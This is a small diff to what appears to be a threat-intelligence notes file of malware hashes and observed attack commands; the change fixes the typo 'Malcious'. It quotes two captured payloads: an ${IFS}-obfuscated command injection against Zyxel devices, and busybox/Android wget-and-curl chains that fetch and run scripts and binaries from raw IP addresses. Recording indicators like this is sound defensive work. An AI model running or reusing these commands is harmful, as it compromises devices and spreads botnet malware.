@@ -17,7 +17,7 @@ https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe9
 d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
 
-Malcious Commands seen:
+Malicious Commands seen:
 /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;
 cd /data/local/tmp/; busybox wget http://103.67.199.44/w.sh; sh w.sh; curl http://103.67.199.44/c.sh; sh c.sh; wget http://103.67.199.44/wget.sh; sh wget.sh; curl http://103.67.199.44/wget.sh; sh wget.sh; busybox wget http://103.67.199.44/wget.sh; sh wget.sh; busybox curl http://103.67.199.44/wget.sh; sh wget.sh
 
